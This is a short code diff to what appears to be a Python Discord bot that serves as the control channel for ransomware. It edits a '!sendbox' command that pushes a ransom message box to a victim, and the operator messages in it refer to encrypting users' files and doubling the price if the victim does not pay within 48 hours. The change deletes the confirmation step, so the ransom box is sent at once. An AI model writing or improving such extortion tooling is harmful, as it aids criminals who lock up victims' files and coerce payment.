@@ -413,14 +413,8 @@ async def on_message(message):
 
 
         if message.content == "!sendbox":
-            from time import sleep
-            await message.channel.send("Are you done encrypting all the users files and ready to send the scary message box? ```Type YES if ready``` You have 60 secs!")
-            sleep(1)
-            if message.content == "YES":
                     await message.channel.send("Sent message to user! ```If victim does not pay within 48 hours double the price!```")
                     spam_messagebox()
-            else:
-                await message.channel.send("Canceled sending the message box to user")
 
 
         if message.content == "!help":
